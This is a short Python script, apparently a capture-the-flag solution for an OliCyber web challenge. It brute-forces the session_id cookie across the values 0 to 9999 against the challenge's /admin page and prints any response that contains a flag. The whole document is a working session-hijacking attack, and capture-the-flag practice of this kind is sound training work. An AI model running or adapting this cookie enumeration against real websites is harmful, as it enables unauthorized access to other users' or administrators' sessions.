import requests


url="http://too-small-reminder.challs.olicyber.it/admin"

for i in range(0,10000):
    r=requests.get(url,cookies={"session_id":str(i)})
    if "flag" in r.text:
        print(r.text)
        
    